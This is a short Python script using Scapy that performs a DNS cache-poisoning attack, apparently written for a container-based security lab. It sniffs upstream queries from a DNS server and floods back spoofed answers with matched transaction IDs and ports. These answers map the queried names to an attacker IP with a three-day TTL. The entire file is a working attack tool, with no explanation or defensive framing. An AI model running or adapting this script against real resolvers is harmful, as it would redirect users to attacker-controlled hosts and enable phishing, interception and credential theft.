#!/usr/bin/env python3
from scapy.all import *

DNS_SERVER_IP = "10.9.0.53"
ATTACKER_IP = "10.9.0.100"

# Layer 3 raw socket binding
sock = conf.L3socket(type=ETH_P_ALL)

def poison_cache(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].opcode == 0 and pkt[IP].src == DNS_SERVER_IP:
        
        qname = pkt[DNS].qd.qname
        qname_str = qname.decode('utf-8')
        print(f"[+] Intercepted forwarder query for: {qname_str}")
        print(f"    Transaction ID: {pkt[DNS].id} | Target Port: {pkt[UDP].dport}")

        # Layer 3/4 Pivoting: Explicitly mirror the expected upstream destination
        ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
        
        # Construct the trusted Answer Section (DNSRR)
        ans_section = DNSRR(
            rrname=qname, 
            type='A', 
            rclass='IN', 
            ttl=259200,        # Cache persistence window (3 days)
            rdata=ATTACKER_IP
        )
        
        # Resolver Emulation Flag Matrix
        dns_layer = DNS(
            id=pkt[DNS].id,    # Match transaction ID 
            qr=1,              # 1 = Response
            opcode=0,          # Standard Query Response
            aa=0,              # Must be 0
            tc=0,              # Not truncated
            rd=pkt[DNS].rd,    # Copy the exact Recursion Desired bit from query (usually 1)
            ra=1,              # 1 = Recursion Available (Standard resolver behavior)
            rcode=0,           # 0 = No Error (Success status)
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=pkt[DNS].qd,    # Include original question block
            an=ans_section     # Append our fake record mapping
        )

        spoofed_pkt = ip_layer / udp_layer / dns_layer
        
        # Flood the open socket window to force ingestion before the 5-second timeout
        for _ in range(5):
            sock.send(spoofed_pkt)
        print(f"[!] Injection burst sequence deployed to BIND.\n")

filter_rule = f"udp and src host {DNS_SERVER_IP} and dst port 53"
print(f"[*] Actively monitoring container network with filter: '{filter_rule}'")
sniff(filter=filter_rule, prn=poison_cache)
